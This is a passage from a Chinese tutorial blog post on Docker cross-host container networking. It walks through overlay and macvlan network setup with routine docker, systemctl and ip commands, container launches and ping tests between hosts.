<h3>7.扩展</h3>
<blockquote>
<p>上例配置的是overlay，实验结果表明，只要在daemon.json中配置了集群的主节点和广播节点，无论子节点容器启动时，是否用 <code>--network</code> ，从节点都可以正常访问访问主节点，从而实现了跨宿主机通信。</p>
<p>但是，在跟随老师的课程学习中，老师的主节点、从节点的 <code>daemon.json</code> 中配置的网络模式是 <code>overlay2</code>，老师的实验结果和我的实验结果是有出入的，也就是，当从节点的容器启动时不用 <code>--network mynet</code> 来指定和主节点同一个网络，那么在从节点中就无法实现跨宿主机通信（不能在从节点ping通主节点）。</p>
</blockquote>
<p>奇葩的是，按老师的配置overlay2,经过反复实验，关键的几个步骤入下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -qa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)   </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#在主从节点都执行，清空容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker/daemon.json</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #把里面的overlay修改为overlay</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mynet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote>
<p>...其他步骤和上面都一致，重新创建mynet报错时，docker ps -a 看一下consul启动没，没有启动的话，启动一下。</p>
<p>最终无法得到老师的答案，无论配置overlay2还是overlay，都可以实现跨宿主机通信，而不是老师的，只要从节点不用--network指定和主节点同一个网络，就不能实现跨宿主机通信。</p>
</blockquote>
<p>注：在反复实验过程中，偶尔有一次，不带 <strong>--network</strong>，在从节点的容器内部不能ping通主节点nginx的虚拟ip，奇怪的是，反复，多次实验，这个仅有1次的ping不通，竟然还原不了，每次又都能ping通了。</p>
<h3>8.小结</h3>
<p>overlay网络模式，核心三步：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1.修改主、从节点的daemon.json，使主从节点通过ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 集群信息关联；</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2.在master节点创建自定义网络mynet并指定网络模式为overlay</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">3.让主、从节点的容器启动时，都指定该自定义网络mynet。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">好处：在主节点创建overlay网络，从节点自动可以通过daemon.json获取主节点创建的自定义网络。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最终，只要在daemon.json中配置好了集群信息，主节点的容器启动时，指定自定义网络mynet(创建时用-d指定为overlay或者overlay2)主从节点就可以愉快的实现跨宿主机通信。</p>
<h2>二、macvlan</h2>
<p>Macvlan的4种模式</p>
<ul>
<li>Bridge</li>
<li>Private</li>
<li>VEPA</li>
<li>Passthrough</li>
</ul>
<p>该模式现在用的比较少，作为了解内容可以拓展一下知识面。</p>
<p>它本身不创建网络，使用的是物理机的网卡，它会导致物理机物理网卡失效，借此会创建虚拟网卡，给虚拟网卡分配网络资源，IP等。</p>
<p>macvlan这种技术能将一块物理网卡虚拟成多块虚拟网卡 ，相当于物理网卡施展了多重影分身之术 ，由一个变多个。</p>
<p>弊端：可能会耗尽物理IP地址，网段内接入的物理机越多，广播的效率/性能就会下降。</p>
<p>该模式，对Linux系统的内核版本是有要求的，支持的版本有 v3.9-3.19 和 4.0+，比较稳定的版本推荐 4.0+。它一般是以内核模块的形式存在，我们可以通过以下方法判断当前系统是否支持：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">modprobe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> macvlan</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #如果没有返回任何信息，代表支持</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lsmod</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> macvlan</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #如果返回如下信息，代表支持</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">macvlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">                19239</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>1.据需清理掉上面的实验数据，并还原daemon.json实验前的默认配置</h3>
<h1>如果是实验数据，可以清除，清除前请确保你明白下面命令的含义，否则不要这么清除</h1>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -qa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#清除所有的容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rmi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -qa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#清除掉所有镜像</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mynet</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #在主节点清除掉自定义的网络</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #重启配置</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #重启docker服务</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>提示，我的本地daemon.json里，只有一行，是配置阿里云加速镜像时创建的。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mkdir</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tee</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker/daemon.json</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .......</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>2.分别在主从节点上，开启网卡混合模式，开启前先ip a查看网卡信息</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ens33</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> promisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #特别注意，你的物理虚拟网卡名称可能是eth0（可以在network-script里修改）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>开启混合模式前，先查看一下网卡信息</p>
<p>分别给主从节点，开启混合网卡模式</p>
<h3>3.分别在主从节点上，通过docker create -d 创建macvlan网络</h3>
<p>分别在主、从节点上创建macvlan，并通过 parent指定其真身爸爸是物理网卡ens33。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#部分主机的虚拟物理网卡不是ens33,部分名称是eth0 ,(我自定义名称是myMaclan，不是myMacvlan，叫什么随意)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> macvlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --subnet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.30.0.0/16</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gateway</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.30.0.2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> parent=ens33</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myMaclan</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> macvlan</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --subnet=ip段（10.10.10.0/24）</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gateway=网关</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> parent=网卡名称</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> macvlan_mode=bridge</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bridgemacvlan（网络名称）</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>注：对该命令的参数不了解的小伙伴，可以通过docker network create  --help来获悉更多的参数。细心的小伙伴发现，第一个案例该命令创建overlay网络时，使用的是--opt，此处使用的是-o，它们两个是一个命令，-o等价于--opt，使用场景主要是用于多个参数时，放到对应参数前面。它是一个map[]集合，也就是说，每个参数的前面都添加-o，则这些参数同属于一个-o的集合。</p>
<h3>4.在主节点CentOS 7.9上使用macvlan网络模式，启动nginx并指定IP</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myMacvlan</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ip</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.30.0.3</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx:alpine</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> XXX</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --net=bridgemacvlan</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ip=容器ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> XXX/XXX:latest</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>注意：这里自定义nginx容器的ip是172.30.0.3，下个步骤在从节点tomcat容器内会用到。</p>
<h3>5.在从节点CentOS8.4上，启动tomcat容器时，分别暂不/指定网络模式为macvlan，ping主节点的nginx</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #查看镜像列表（什么镜像不重要，重要的是在容器内部，是可以实现跨宿主机通信）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat:alpine</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #第一次进入从节点容器内部，不指定--network</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -w</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.30.0.3</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   #尝试去ping主节点容器内的nginx的ip，发现不能ping通</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">exit</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myMaclan</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat:alpine</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #第二次进入从节点容器内部，指定--network</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -w</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.30.0.3</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   #尝试去ping主节点容器内的nginx的ip，发现可以ping通</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">exit</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注：如果你对尾部的bash感兴趣，点击进入（从文章尾部开始向上看）</p>
<h3>6.收尾工作，关闭虚拟网卡混合模式，清除容器</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -qa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)   </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#清除容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myMaclan</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">      #清除自定义网卡</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ens33</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> promisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> off</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   #取消网卡的混合模式</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #验证是否已取消</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>7.小节</h3>
<p>该模式的小实验比较简单，3个核心步骤：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1、主、从节点分别创建macvlan网络</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2、主节点启动容器(nginx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)时，指定网络模式为自定义的网络</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">3、从节点启动容器(tomcat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)时，分别先不指定/指定自定义网络后，进入(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tomcat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)容器，去尝试ping主节点容器(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nginx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)IP。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该方式，一样可以实现跨节点通信，但只是昙花一现，满足了特定时期需求。</p>
<p>弊端：主从节点上都需要创建macvlan的自定义网络，容器启动时也都需要指定网络模式为macvlan，不难但是比较low稍显繁琐。</p>
<p>macvlan的通信原理，主从节点都需要创建完全相同的自定义网络，都通过-d或者--driver指定为macvlan，同时指定--subnet子网网段和--gateway网关，当然如果创建自定义网络时你不指定，在docker run命令时，你依然可以指定。</p>
<p>但是，需要注意的是，主从节点各自定义的macvan的网关和子网网段要相同，从而造成两个不同的宿主机的自定义网卡都处于同一个网段，给人的错觉就是他们就是1个小的局域网，在主从节点中的容器在docker run时，都通过--network指定这个自定义的网络。</p>
<p>这样，就自然而然的实现了跨宿主机通信。</p>
<h2>总结</h2>
